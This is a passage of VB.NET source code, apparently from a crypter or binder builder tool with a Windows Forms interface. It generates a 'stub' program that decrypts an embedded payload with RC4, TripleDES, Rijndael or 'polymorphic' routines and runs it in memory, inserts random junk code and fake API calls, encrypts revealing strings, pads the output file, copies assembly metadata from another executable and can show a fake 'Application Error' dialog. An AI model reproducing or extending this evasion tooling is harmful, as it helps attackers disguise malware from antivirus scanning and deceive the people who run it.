                Binder = "Dim FDC As String = System.Text.Encoding.Default.GetString(SDeCrypt(System.Text.Encoding.Default.GetBytes(ReverseString(R.GetObject(" & Chr(34) & "Ev" & _
               Chr(34) & "))), " & "R.GetObject(" & Chr(34) & "K" & Chr(34) & ")))" & NewLine & _
               "filled = Split(FDC, " & Chr(34) & "@|C|@" & Chr(34) & ")"
            ElseIf RadioButton17.Checked = True Then
                Binder = "Dim FDC As String = System.Text.Encoding.Default.GetString(AD(System.Text.Encoding.Default.GetBytes(ReverseString(R.GetObject(" & Chr(34) & "Ev" & _
               Chr(34) & ")))))" & NewLine & _
               "filled = Split(FDC, " & Chr(34) & "@|C|@" & Chr(34) & ")"
            ElseIf RadioButton2.Checked = True Then
                Binder = "Dim FDC As String = xEncryptionD(R.GetObject(" & Chr(34) & "K" & _
               Chr(34) & "), " & "R.GetObject(" & Chr(34) & "Ev" & Chr(34) & "))" & NewLine & _
               "filled = Split(FDC, " & Chr(34) & "@|C|@" & Chr(34) & ")"
            ElseIf RadioButton3.Checked = True Then
                Binder = "Dim FDC As String = System.Text.Encoding.Default.GetString(D.PolyDecrypt(System.Text.Encoding.Default.GetBytes(ReverseString(R.GetObject(" & Chr(34) & "Ev" & _
               Chr(34) & ")))))" & NewLine & _
               "filled = Split(FDC, " & Chr(34) & "@|C|@" & Chr(34) & ")"
            ElseIf RadioButton21.Checked = True Then
                Binder = "Dim FDC As String = D.Decrypt(R.GetObject(" & Chr(34) & "Ev" & _
               Chr(34) & "))" & NewLine & _
               "filled = Split(FDC, " & Chr(34) & "@|C|@" & Chr(34) & ")"
            ElseIf RadioButton24.Checked = True Then
                Binder = "Dim FDC As String = System.Text.Encoding.Default.GetString(PolyMorphicStairs.PolyDecrypt(System.Text.Encoding.Default.GetBytes(ReverseString(R.GetObject(" & Chr(34) & "Ev" & _
               Chr(34) & "))), " & "R.GetObject(" & Chr(34) & "K" & Chr(34) & ")))" & NewLine & _
               "filled = Split(FDC, " & Chr(34) & "@|C|@" & Chr(34) & ")"
            End If
            Stub = Stub.Replace("'FilledSplitting", Binder)
        End If
        If CheckBox62.Checked = True Then
            Stub = Stub.Replace("'junkFunction", JunkFunction(NumericUpDown10.Value))
        End If
        If CheckBox64.Checked = True Then
            Stub = Stub.Replace("'heavyJunk", GenerateJunk(NumericUpDown12.Value))
        End If
        Dim FileByte As Byte() = IO.File.ReadAllBytes(TextBox1.Text)
        If FileByte(60) = 128 Then
            Stub = Stub.Replace("'InvokeSub", My.Resources.Invoke)
            Dim DotnetLoader As String
            If RadioButton1.Checked = True Then
                DotnetLoader = "LoadMethod(" & """IX""" & ", " & """R""" & ", CC(ReverseString(R.GetObject(" & """X""" & "))), New Object() {Rc4(System.Text.Encoding.Default.GetBytes(ReverseString(R.GetObject(" & """F""" & "))), R.GetObject(" & """K""" & ")), I})"
                Stub = Stub.Replace(DotnetLoader, "RInvoke(RC4(System.Text.Encoding.Default.GetBytes(ReverseString(R.GetObject(" & """F""" & "))), R.GetObject(" & _
                                    """K""" & ")))")
            ElseIf RadioButton4.Checked = True Then
                DotnetLoader = "LoadMethod(" & """IX""" & ", " & """R""" & _
                ", CC(ReverseString(R.GetObject(" & """X""" & "))), New Object() {III, I})"
                Stub = Stub.Replace(DotnetLoader, "RInvoke(III)")
            ElseIf RadioButton9.Checked = True Then
                DotnetLoader = "LoadMethod(" & """IX""" & ", " & """R""" & _
                ", CC(ReverseString(R.GetObject(" & """X""" & "))), New Object() {III, I})"
                Stub = Stub.Replace(DotnetLoader, "RInvoke(III)")
            ElseIf RadioButton10.Checked = True Then
                DotnetLoader = "LoadMethod(" & """IX""" & ", " & """R""" & ", CC(ReverseString(R.GetObject(" & """X""" & "))), New Object() {SDecrypt(System.Text.Encoding.Default.GetBytes(ReverseString(R.GetObject(" & """F""" & "))), R.GetObject(" & """K""" & ")), I})"
                Stub = Stub.Replace(DotnetLoader, "RInvoke(SDecrypt(System.Text.Encoding.Default.GetBytes(ReverseString(R.GetObject(" & """F""" & "))), R.GetObject(" & _
                                    """K""" & ")))")
            ElseIf RadioButton17.Checked = True Then
                DotnetLoader = "LoadMethod(" & """IX""" & ", " & """R""" & ", CC(ReverseString(R.GetObject(" & """X""" & "))), New Object() {AD(System.Text.Encoding.Default.GetBytes(ReverseString(R.GetObject(" & """F""" & ")))), I})"
                Stub = Stub.Replace(DotnetLoader, "RInvoke(AD(System.Text.Encoding.Default.GetBytes(ReverseString(R.GetObject(" & """F""" & ")))))")
            ElseIf RadioButton2.Checked = True Then
                DotnetLoader = " LoadMethod(" & """IX""" & ", " & """R""" & _
                ", CC(ReverseString(R.GetObject(" & """X""" & "))), New Object() {III, I})"
                Stub = Stub.Replace(DotnetLoader, "RInvoke(III)")
            ElseIf RadioButton3.Checked = True Then
                DotnetLoader = "LoadMethod(" & """IX""" & ", " & """R""" & ", CC(ReverseString(R.GetObject(" & """X""" & "))), New Object() {D.PolyDeCrypt(System.Text.Encoding.Default.GetBytes(ReverseString(R.GetObject(" & """F""" & ")))), I})"
                Stub = Stub.Replace(DotnetLoader, "RInvoke(D.PolyDeCrypt(System.Text.Encoding.Default.GetBytes(ReverseString(R.GetObject(" _
                                    & """F""" & ")))))")
            ElseIf RadioButton24.Checked = True Then
                DotnetLoader = "LoadMethod(" & """IX""" & ", " & """R""" & ", CC(ReverseString(R.GetObject(" & """X""" & "))), New Object() {PolyMorphicStairs.PolyDecrypt(System.Text.Encoding.Default.GetBytes(ReverseString(R.GetObject(" & """F""" & "))), R.GetObject(" & """K""" & ")), I})"
                Stub = Stub.Replace(DotnetLoader, "RInvoke(PolyMorphicStairs.PolyDecrypt(System.Text.Encoding.Default.GetBytes(ReverseString(R.GetObject(" & """F""" & "))), R.GetObject(" & _
                                    """K""" & ")))")
            ElseIf RadioButton21.Checked = True Then
                DotnetLoader = " LoadMethod(" & """IX""" & ", " & """R""" & ", CC(ReverseString(R.GetObject(" & """X""" & "))), New Object() {C, I})"
                Stub = Stub.Replace(DotnetLoader, "RInvoke(C)")
            End If
        End If
        Stub = Stub.Replace("""CSharp""", EncryptString("CSharp"))
        Stub = Stub.Replace("""System.dll""", EncryptString("System.dll"))
        Stub = Stub.Replace("""System.Management.dll""", EncryptString("System.Management.dll"))
        Stub = Stub.Replace("""/platform:x86""", EncryptString("/platform:x86"))
        If CheckBox57.Checked = True Then

            Dim SP() As String

            SP = Split(My.Resources.APIs, "|")

            If NumericUpDown9.Value < 2 Then

                Stub = Stub.Replace("'FakeAPI#1", SP(0))

            ElseIf NumericUpDown9.Value < 3 Then

                Stub = Stub.Replace("'FakeAPI#1", SP(0))

                Stub = Stub.Replace("'FakeAPI#2", SP(1))

            ElseIf NumericUpDown9.Value < 4 Then

                Stub = Stub.Replace("'FakeAPI#1", SP(0))
                Stub = Stub.Replace("'FakeAPI#2", SP(1))

                Stub = Stub.Replace("'FakeAPI#3", SP(2))

            ElseIf NumericUpDown9.Value < 5 Then

                Stub = Stub.Replace("'FakeAPI#1", SP(0))

                Stub = Stub.Replace("'FakeAPI#2", SP(1))

                Stub = Stub.Replace("'FakeAPI#3", SP(2))

                Stub = Stub.Replace("'FakeAPI#4", SP(3))

            ElseIf NumericUpDown9.Value < 6 Then

                Stub = Stub.Replace("'FakeAPI#1", SP(0))

                Stub = Stub.Replace("'FakeAPI#2", SP(1))

                Stub = Stub.Replace("'FakeAPI#3", SP(2))

                Stub = Stub.Replace("'FakeAPI#4", SP(3))

                Stub = Stub.Replace("'FakeAPI#5", SP(4))

            ElseIf NumericUpDown9.Value < 7 Then

                Stub = Stub.Replace("'FakeAPI#1", SP(0))

                Stub = Stub.Replace("'FakeAPI#2", SP(1))

                Stub = Stub.Replace("'FakeAPI#3", SP(2))

                Stub = Stub.Replace("'FakeAPI#4", SP(3))

                Stub = Stub.Replace("'FakeAPI#5", SP(4))

                Stub = Stub.Replace("'FakeAPI#6", SP(5))

            ElseIf NumericUpDown9.Value < 8 Then

                Stub = Stub.Replace("'FakeAPI#1", SP(0))

                Stub = Stub.Replace("'FakeAPI#2", SP(1))

                Stub = Stub.Replace("'FakeAPI#3", SP(2))

                Stub = Stub.Replace("'FakeAPI#4", SP(3))

                Stub = Stub.Replace("'FakeAPI#5", SP(4))

                Stub = Stub.Replace("'FakeAPI#6", SP(5))

                Stub = Stub.Replace("'FakeAPI#7", SP(6))

            ElseIf NumericUpDown9.Value < 9 Then

                Stub = Stub.Replace("'FakeAPI#1", SP(0))

                Stub = Stub.Replace("'FakeAPI#2", SP(1))

                Stub = Stub.Replace("'FakeAPI#3", SP(2))

                Stub = Stub.Replace("'FakeAPI#4", SP(3))

                Stub = Stub.Replace("'FakeAPI#5", SP(4))

                Stub = Stub.Replace("'FakeAPI#6", SP(5))

                Stub = Stub.Replace("'FakeAPI#7", SP(6))

                Stub = Stub.Replace("'FakeAPI#8", SP(7))

            ElseIf NumericUpDown9.Value < 10 Then


                Stub = Stub.Replace("'FakeAPI#1", SP(0))

                Stub = Stub.Replace("'FakeAPI#2", SP(1))

                Stub = Stub.Replace("'FakeAPI#3", SP(2))

                Stub = Stub.Replace("'FakeAPI#4", SP(3))

                Stub = Stub.Replace("'FakeAPI#5", SP(4))

                Stub = Stub.Replace("'FakeAPI#6", SP(5))

                Stub = Stub.Replace("'FakeAPI#7", SP(6))

                Stub = Stub.Replace("'FakeAPI#8", SP(7))

                Stub = Stub.Replace("'FakeAPI#9", SP(8))

            ElseIf NumericUpDown9.Value < 11 Then

                Stub = Stub.Replace("'FakeAPI#1", SP(0))

                Stub = Stub.Replace("'FakeAPI#2", SP(1))

                Stub = Stub.Replace("'FakeAPI#3", SP(2))

                Stub = Stub.Replace("'FakeAPI#4", SP(3))

                Stub = Stub.Replace("'FakeAPI#5", SP(4))

                Stub = Stub.Replace("'FakeAPI#6", SP(5))

                Stub = Stub.Replace("'FakeAPI#7", SP(6))

                Stub = Stub.Replace("'FakeAPI#8", SP(7))

                Stub = Stub.Replace("'FakeAPI#9", SP(8))

                Stub = Stub.Replace("'FakeAPI#A", SP(9))

            ElseIf NumericUpDown9.Value < 12 Then

                Stub = Stub.Replace("'FakeAPI#1", SP(0))

                Stub = Stub.Replace("'FakeAPI#2", SP(1))

                Stub = Stub.Replace("'FakeAPI#3", SP(2))

                Stub = Stub.Replace("'FakeAPI#4", SP(3))

                Stub = Stub.Replace("'FakeAPI#5", SP(4))

                Stub = Stub.Replace("'FakeAPI#6", SP(5))

                Stub = Stub.Replace("'FakeAPI#7", SP(6))

                Stub = Stub.Replace("'FakeAPI#8", SP(7))

                Stub = Stub.Replace("'FakeAPI#9", SP(8))

                Stub = Stub.Replace("'FakeAPI#A", SP(9))

                Stub = Stub.Replace("'FakeAPI#B", SP(10))

            End If

        End If

        Stub = Stub.Replace("""APPDATA""", EncryptString("APPDATA"))

        'Dim xx As New IO.StreamWriter(Application.StartupPath & "\1.txt")
        'xx.WriteLine(Stub)
        'xx.Flush()
        'xx.Close()
    End Sub
    Function GenerateJunk(ByVal ammount As Integer) As String

        If ammount = 0 Then
            ammount = 1
        End If

        Dim out As String = "Module " & SS(20)
        Dim y As Integer = 0

        Do Until y = ammount

            Rnd()
            Dim a As Integer = n(3, 1)

            Dim e As String = SS(60)
            If a = 1 Then
                out += vbNewLine & vbNewLine & "Public Function " & SS(124) & "(" & SS(16) & " as string)as string" & vbNewLine

                out += "on error goto " & e & vbNewLine
            Else
                out += vbNewLine & "Public Sub " & SS(n(50, 8)) & "(" & SS(49) & " as string)" & vbNewLine
            End If

            Dim i As Integer = 0

            Dim limit As Integer = n(30, 10)

            Do Until i = limit
                Rnd()
                Dim type As Integer = n(5, 0)


                If type = 1 Then
                    out += "Dim " & SS(26) & " as string = " & Chr(34) & SS(n(35, 76)) & Chr(34) & vbNewLine
                    i += 1
                ElseIf type = 2 Then
                    out += "msgbox(" & Chr(34) & SS(n(100, 276)) & Chr(34) & ")" & vbNewLine
                    i += 1
                ElseIf type = 3 Then
                    Rnd()
                    out += "Dim " & SS(56) & " as integer = " & n(999999, 100000) & vbNewLine
                    i += 1
                Else
                    out += "dim " & SS(n(10, 60)) & " as integer = " & n(100000, 9999999) & " + " & n(214124, 1243145) & " + " & n(214124, 1243145) & " + " & n(214124, 1243145) & vbNewLine
                End If



            Loop
            If a = 1 Then
                out += e & ":" & vbNewLine

                Dim h As Integer = 0
                Dim hl As Integer = n(10, 3)
                Do Until h = hl

                    Dim type As Integer = n(4, 0)


                    If type = 1 Then
                        out += "Dim " & SS(26) & " as string = " & Chr(34) & SS(n(35, 76)) & Chr(34) & vbNewLine
                        i += 1
                    ElseIf type > 1 Then
                        out += "msgbox(" & Chr(34) & SS(n(100, 276)) & Chr(34) & ")" & vbNewLine
                        i += 1
                        out += "If " & n(100000, 9999999) & " > " & n(214124, 1243145) & " then" & vbNewLine

                        out += "Dim " & SS(26) & " as string = " & Chr(34) & SS(n(35, 76)) & Chr(34) & vbNewLine
                        out += "Dim " & SS(26) & " as string = " & Chr(34) & SS(n(35, 76)) & Chr(34) & vbNewLine
                        out += "Dim " & SS(26) & " as string = " & Chr(34) & SS(n(35, 76)) & Chr(34) & vbNewLine
                        out += "End if" & vbNewLine

                    Else
                        Rnd()
                        out += "Dim " & SS(56) & " as integer = " & n(999999, 100000) & vbNewLine
                        i += 1
                    End If
                    h += 1
                Loop


                out += "End Function" & vbNewLine & vbNewLine

            Else
                out += "End Sub" & vbNewLine & vbNewLine
            End If
            y += 1
        Loop
        out += "End Module"

        Return out
    End Function

    Function SS(ByVal len As String) As String
        Dim x As New Password
        Return x.GeneratePassword(True, True, False, False, len)
    End Function

    Public Function n(ByVal MaxNumber As Integer, _
    Optional ByVal MinNumber As Integer = 0) As Integer
        Rnd()
        Threading.Thread.Sleep(5)
        'initialize random number generator
        Dim r As New Random(System.DateTime.Now.Millisecond)

        'if passed incorrect arguments, swap them
        'can also throw exception or return 0

        If MinNumber > MaxNumber Then
            Dim t As Integer = MinNumber
            MinNumber = MaxNumber
            MaxNumber = t
        End If

        Return r.Next(MinNumber, MaxNumber)

    End Function
    Public Class Password

        Private Const PASS_UPPERS As String = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        Private Const PASS_LOWERS As String = "abcdefghijklmnopqrstuvwxyz"
        Private Const PASS_NUMBERS As String = "0123456789"
        Private Const PASS_SPECIALS As String = "~`!@#$%^&*()_+=-{[}]|;:'<,>.?"

        Public Function GeneratePassword(ByVal Uppers As Boolean, ByVal Lowers As Boolean, ByVal Numbers As Boolean, ByVal Specials As Boolean, ByVal passwordLength As Integer) As String

            Dim strCharacters As String
            Dim strNewPassword As String
            Dim p As Integer

            If Uppers = True Then
                strCharacters = strCharacters & PASS_UPPERS
            End If
            If Lowers = True Then
                strCharacters = strCharacters & PASS_LOWERS
            End If
            If Numbers = True Then
                strCharacters = strCharacters & PASS_NUMBERS
            End If
            If Specials = True Then
                strCharacters = strCharacters & PASS_SPECIALS
            End If

            Randomize()

            For p = 0 To (passwordLength - 1)
                strNewPassword = strNewPassword + Mid(strCharacters, Len(strCharacters) * Rnd() + 1, 1)
            Next

            GeneratePassword = strNewPassword

        End Function

    End Class
    Function JunkFunction(ByVal countloop As Integer)

        Dim i As Integer = 0

        Dim path As String = Application.StartupPath & "\Hold"

        Do Until i = countloop

            Dim x As String = Environment.NewLine

            Dim xxx As New Random

            Dim random As String = x & x & "Function " & RandomVar() & x & x & "Dim " & RandomVar() & " As String = " & Chr(34) & _
            RandomVar() & Chr(34) & x & x & "Dim " & RandomVar() & " As Integer = " & xxx.Next(20, 99) & x & x & _
            "End Function" & x & x

            IO.File.AppendAllText(path, random)

            i = i + 1

        Loop

        Dim s As String = IO.File.ReadAllText(path)

        IO.File.Delete(path)

        Return s

    End Function

    Public Function RandomVar(Optional ByVal Count As Integer = Nothing) As Object
        Const LowerCase As String = "abcdefghijklmnopqrstuvwxyz"
        Const UpperCase As String = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        Const Num As String = "_"
        Dim totalequivalent As String
        Dim i As Short
        totalequivalent = LowerCase & UpperCase & Num
        If Count = Nothing Then
            For i = 1 To CInt("15")
                RandomVar = RandomVar & Mid(totalequivalent, Int((Rnd() * Len(totalequivalent)) + 1), 1)
            Next i
        Else
            For i = 1 To CInt(Count)
                RandomVar = RandomVar & Mid(totalequivalent, Int((Rnd() * Len(totalequivalent)) + 1), 1)
            Next i
        End If
        Return RandomVar
    End Function
    Function PumpFile(ByVal xFile As String, ByVal xKilobytes As Integer) As String
        Dim z = IO.File.OpenWrite(xFile)
        Dim c = z.Seek(0, SeekOrigin.[End])
        Dim b = Convert.ToInt32(xKilobytes)
        Dim v As Decimal = b * 1048
        While c < v
            c += 1
            z.WriteByte(0)
        End While
        z.Close()
        Return 0
    End Function
    Dim xpath As String = Application.StartupPath & "\Q"
    Function EncryptString(ByVal Input As String) As String

        Dim str(5) As String

restart:

        MyGuid = Guid.NewGuid

        str(0) = MyGuid.ToString

        str(1) = Input

        If RadioButton19.Checked = True Then

            str(2) = Encryption_Algorithms.TripleDES(str(1), str(0), True)

            str(3) = Encryption_Algorithms.TripleDESdecrypt(str(2), str(0), True)

        ElseIf RadioButton20.Checked = True Then

            str(2) = Encryption_Algorithms.Rijndael(str(1), str(0))

            str(3) = Encryption_Algorithms.RijndaelDecrypt(str(2), str(0))

        ElseIf RadioButton18.Checked = True Then

            str(2) = Encryption_Algorithms.xEncryption(str(0), str(1))

            str(3) = Encryption_Algorithms.xEncryptionD(str(0), str(2))

        ElseIf RadioButton25.Checked = True Then

            str(2) = Encryption_Algorithms.PolyCrypt(str(1))

            str(3) = Encryption_Algorithms.PolyDec(str(2))

        End If

        If str(3) = str(1) Then

            If RadioButton19.Checked = True Then

                str(4) = "TripleDESDecrypt" & "(" & Chr(34) & str(2) & Chr(34) & ", " & Chr(34) & str(0) & Chr(34) & ", True" & ")"

            ElseIf RadioButton20.Checked = True Then

                str(4) = "RijndaelDecrypt" & "(" & Chr(34) & str(2) & Chr(34) & ", " & Chr(34) & str(0) & Chr(34) & ")"

            ElseIf RadioButton18.Checked = True Then

                str(4) = "xEncryptionD" & "(" & Chr(34) & str(0) & Chr(34) & ", " & Chr(34) & str(2) & Chr(34) & ")"

            ElseIf RadioButton25.Checked = True Then

                str(4) = "PolyDec" & "(" & Chr(34) & str(2) & Chr(34) & ")"

            End If

        Else

            GoTo restart

        End If

        Return str(4)

    End Function
    Dim _P As New Point, _X, _Y As Integer
    Private Sub MD1() Handles PictureBox1.MouseDown
        _X = MousePosition.X - Location.X : _Y = MousePosition.Y - Location.Y
    End Sub
    Private Sub MM1(ByVal S, ByVal E) Handles PictureBox1.MouseMove
        If E.Button = 1048576 Then : _P = MousePosition : _P.X -= _X : _P.Y -= _Y : Location = _P : End If
    End Sub
    Public Shared Function ReverseString(ByVal s As String) As String
        Dim arr As Char() = s.ToCharArray()
        Array.Reverse(arr)
        Return New String(arr)
    End Function
    Sub Compile(ByVal Code As String, ByVal Path As String, ByVal FormProgram As Boolean, ByVal MainClass As String, _
              ByVal CSharp As Boolean, Optional ByVal Resource As String = Nothing, Optional ByVal _
              Icon As String = Nothing)
        Dim CodeProvider As Object
        If CSharp Then
            CodeProvider = New Microsoft.CSharp.CSharpCodeProvider
        Else
            CodeProvider = New Microsoft.VisualBasic.VBCodeProvider
        End If
        Dim Parameters As New CodeDom.Compiler.CompilerParameters
        With Parameters
            If Not Resource = Nothing Then
                .EmbeddedResources.Add(Resource)
            End If
            .GenerateExecutable = True
            .OutputAssembly = Path
            If FormProgram Then .CompilerOptions += "/target:winexe /platform:x86 /removeintchecks+"
            If Not Icon = Nothing Then
                .CompilerOptions += " /win32icon:" & tempicon
            End If
            .MainClass = MainClass
            .IncludeDebugInformation = False
            For Each ASM In AppDomain.CurrentDomain.GetAssemblies
                .ReferencedAssemblies.Add(ASM.Location)
            Next
        End With
        Dim Results = CodeProvider.CompileAssemblyFromSource(Parameters, Code)
        If Results.Errors.Count > 0 Then
            For Each E In Results.Errors
                MsgBox(E.ErrorText)
            Next
        End If
        If IO.File.Exists(tempicon) Then
            IO.File.Delete(tempicon)
        End If
    End Sub

    Private Sub MButton6_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButton6.Click
        oo.DefaultExt = ""
        oo.Filter = "Portable Executable Files (*.Exe)|*.Exe"
        oo.FilterIndex = 1
        oo.FileName = ""
        If oo.ShowDialog(Me) = 1 Then
            TextBox3.Text = oo.FileName
        End If
    End Sub

    Private Sub MButton10_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButton10.Click
        Application.Exit()
    End Sub

    Private Sub CheckBox26_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox26.CheckedChanged
        If CheckBox26.Checked = True Then

            CheckBox2.Checked = True

            CheckBox3.Checked = True

            CheckBox4.Checked = True

            CheckBox5.Checked = True

            CheckBox6.Checked = True

            CheckBox7.Checked = True

            CheckBox8.Checked = True

            CheckBox9.Checked = True

            CheckBox10.Checked = True

            CheckBox11.Checked = True

            CheckBox12.Checked = True

            CheckBox13.Checked = True

            CheckBox14.Checked = True

            CheckBox15.Checked = True

            CheckBox16.Checked = True

            CheckBox17.Checked = True

            CheckBox18.Checked = True

            CheckBox19.Checked = True

            CheckBox20.Checked = True

            CheckBox21.Checked = True

            CheckBox22.Checked = True

            CheckBox23.Checked = True

            CheckBox24.Checked = True

            CheckBox25.Checked = True

        Else

            CheckBox2.Checked = False

            CheckBox3.Checked = False

            CheckBox4.Checked = False

            CheckBox5.Checked = False

            CheckBox6.Checked = False

            CheckBox7.Checked = False

            CheckBox8.Checked = False

            CheckBox9.Checked = False

            CheckBox10.Checked = False

            CheckBox11.Checked = False

            CheckBox12.Checked = False

            CheckBox13.Checked = False

            CheckBox14.Checked = False

            CheckBox15.Checked = False

            CheckBox16.Checked = False

            CheckBox17.Checked = False

            CheckBox18.Checked = False

            CheckBox19.Checked = False

            CheckBox20.Checked = False

            CheckBox21.Checked = False

            CheckBox22.Checked = False

            CheckBox23.Checked = False

            CheckBox24.Checked = False

            CheckBox25.Checked = False

        End If

    End Sub
    Dim o2 As New OpenFileDialog
    Private Sub MButton7_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButton7.Click
        o2.DefaultExt = ""

        o2.Filter = "Portable Executable Files (*.Exe)|*.Exe"

        o2.FilterIndex = 1

        o2.FileName = ""

        If o2.ShowDialog(Me) = 1 Then

            TextBox17.Text = o2.FileName

            Try

                LoadAttributes(Assembly.LoadFile(TextBox17.Text))

            Catch ex As Exception

                MessageBox.Show("Assembly Loader only works for .NET Files", "Unsuccessful", MessageBoxButtons.OK, MessageBoxIcon.Information)

            End Try

        End If
    End Sub
    Sub LoadAttributes(ByVal assembly As Assembly)

        Dim P = New Properties(assembly)

        TextBox5.Text = P.Description

        TextBox6.Text = P.Company

        TextBox7.Text = P.Copyright

        NumericUpDown1.Value = P.FileVersion.Major

        NumericUpDown2.Value = P.FileVersion.Minor

        NumericUpDown3.Value = P.FileVersion.Build

        NumericUpDown4.Value = P.FileVersion.Revision

    End Sub

    Structure Properties

        Dim Title, Description, Company, Product, Copyright, Trademark As String, Version, FileVersion As Version

        Private H As Assembly

        Sub New(ByVal assembly As Assembly)

            H = assembly

            Title = Search(Of AssemblyTitleAttribute)().Title

            Description = Search(Of AssemblyDescriptionAttribute)().Description

            Company = Search(Of AssemblyCompanyAttribute)().Company

            Product = Search(Of AssemblyProductAttribute)().Product

            Copyright = Search(Of AssemblyCopyrightAttribute)().Copyright

            Trademark = Search(Of AssemblyTrademarkAttribute)().Trademark

            Version = New Version(assembly.GetName.Version.ToString)

            Dim T = Search(Of AssemblyFileVersionAttribute)()

            FileVersion = New Version(If(T Is Nothing, "0.0.0.0", T.Version))

        End Sub

        Private Function Search(Of T)() As T

            Try

                Return H.GetCustomAttributes(GetType(T), 0)(0)

            Catch : End Try

        End Function


        Public Overrides Function ToString() As String

            Dim S As New System.Text.StringBuilder, B = "<Assembly: Assembly", E = """)>"

            If Title <> "" Then S.AppendLine(B & "Title(""" & Title & E)

            If Description <> "" Then S.AppendLine(B & "Description(""" & Description & E)

            If Company <> "" Then S.AppendLine(B & "Company(""" & Company & E)

            If Product <> "" Then S.AppendLine(B & "Product(""" & Product & E)

            If Copyright <> "" Then S.AppendLine(B & "Copyright(""" & Copyright & E)

            If Trademark <> "" Then S.AppendLine(B & "Trademark(""" & Trademark & E)

            If Version.ToString <> "0.0.0.0" Then S.AppendLine(B & "Version(""" & Version.ToString & E)

            If FileVersion.ToString <> "0.0.0.0" Then S.AppendLine(B & "FileVersion(""" & FileVersion.ToString & E)

            Return S.ToString

        End Function

    End Structure

    Private Sub MButton11_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButton11.Click
        TextBox5.Clear()

        TextBox6.Clear()

        TextBox7.Clear()

        NumericUpDown1.Value = 1

        NumericUpDown2.Value = 0

        NumericUpDown3.Value = 0

        NumericUpDown4.Value = 0
    End Sub

    Private Sub CheckBox28_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox28.CheckedChanged
        If CheckBox28.Checked = True Then

            GroupBox2.Enabled = True

            RadioButton11.Checked = True

        Else

            GroupBox2.Enabled = False

            RadioButton11.Checked = False

        End If

    End Sub

    Private Sub CheckBox68_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox68.CheckedChanged
        If CheckBox68.Checked = True Then

            NumericUpDown6.Enabled = True

            RadioButton15.Enabled = True

            RadioButton15.Checked = True

            RadioButton16.Enabled = True

        Else

            NumericUpDown6.Enabled = False

            NumericUpDown7.Enabled = False

            RadioButton15.Enabled = False

            RadioButton15.Checked = False

            RadioButton16.Enabled = False

            RadioButton16.Checked = False

        End If
    End Sub

    Private Sub MButton8_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButton8.Click
        If RadioButton26.Checked = True Then

            If RadioButton43.Checked Then

                MessageBox.Show(TextBox19.Text, TextBox9.Text, MessageBoxButtons.OK, MessageBoxIcon.Error)

            ElseIf RadioButton45.Checked Then

                MessageBox.Show(TextBox19.Text, TextBox9.Text, MessageBoxButtons.YesNo, MessageBoxIcon.Error)

            ElseIf RadioButton46.Checked Then

                MessageBox.Show(TextBox19.Text, TextBox9.Text, MessageBoxButtons.OKCancel, MessageBoxIcon.Error)

            ElseIf RadioButton47.Checked Then

                MessageBox.Show(TextBox19.Text, TextBox9.Text, MessageBoxButtons.RetryCancel, MessageBoxIcon.Error)

            End If

        ElseIf RadioButton28.Checked = True Then

            If RadioButton43.Checked Then

                MessageBox.Show(TextBox19.Text, TextBox9.Text, MessageBoxButtons.OK, MessageBoxIcon.Information)

            ElseIf RadioButton45.Checked Then

                MessageBox.Show(TextBox19.Text, TextBox9.Text, MessageBoxButtons.YesNo, MessageBoxIcon.Information)

            ElseIf RadioButton46.Checked Then

                MessageBox.Show(TextBox19.Text, TextBox9.Text, MessageBoxButtons.OKCancel, MessageBoxIcon.Information)

            ElseIf RadioButton47.Checked Then

                MessageBox.Show(TextBox19.Text, TextBox9.Text, MessageBoxButtons.RetryCancel, MessageBoxIcon.Information)

            End If

        End If
    End Sub

    Private Sub CheckBox29_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox29.CheckedChanged
        If CheckBox29.Checked = True Then
            TextBox19.Text = "The application failed to initialize properly (0xc000007b). Click on OK to terminate the application."
            TextBox9.Text = "Application Error"
        Else
            TextBox19.Text = ""
            TextBox9.Text = ""
        End If
    End Sub
    Function AssemblyChange()

        Return "<Assembly: AssemblyDescription(" & Chr(34) & TextBox5.Text & Chr(34) & ")>" & Environment.NewLine & _
        "<Assembly: AssemblyCompany(" & Chr(34) & TextBox6.Text & Chr(34) & ")>" & Environment.NewLine & _
        "<Assembly: AssemblyVersion(" & Chr(34) & NumericUpDown1.Value & "." & NumericUpDown2.Value & "." & NumericUpDown3.Value & _
        "." & NumericUpDown4.Value & Chr(34) & ")>" & Environment.NewLine & "<Assembly: AssemblyCopyright(" & Chr(34) & _
        TextBox7.Text & Chr(34) & ")>"

    End Function

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        RadioButton15.Enabled = False

        RadioButton16.Enabled = False

        NumericUpDown6.Enabled = False

        NumericUpDown7.Enabled = False

        GroupBox2.Enabled = False

        TabControl1.TabPages(1).Enabled = False

        TabControl1.TabPages(2).Enabled = False

        TabControl1.TabPages(3).Enabled = False

        TabControl1.TabPages(4).Enabled = False

        TabControl1.TabPages(5).Enabled = False

        TabControl1.TabPages(6).Enabled = False

    End Sub

    Private Sub CheckBox71_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox71.CheckedChanged
        If CheckBox71.Checked = True Then

            TabControl1.TabPages(1).Enabled = True

            CheckBox2.Checked = True

            CheckBox3.Checked = True

            CheckBox4.Checked = True

            CheckBox5.Checked = True

            CheckBox6.Checked = True

            CheckBox7.Checked = True

            CheckBox8.Checked = True

            CheckBox9.Checked = True

            CheckBox10.Checked = True

            CheckBox11.Checked = True

            CheckBox12.Checked = True

            CheckBox13.Checked = True

            CheckBox14.Checked = True

            CheckBox15.Checked = True

            CheckBox16.Checked = True

            CheckBox17.Checked = True

            CheckBox18.Checked = True

            CheckBox19.Checked = True

            CheckBox20.Checked = True

            CheckBox21.Checked = True

            CheckBox22.Checked = True

            CheckBox23.Checked = True

            CheckBox24.Checked = True

            CheckBox25.Checked = True

        Else

            TabControl1.TabPages(1).Enabled = False

            CheckBox2.Checked = False

            CheckBox3.Checked = False

            CheckBox4.Checked = False

            CheckBox5.Checked = False

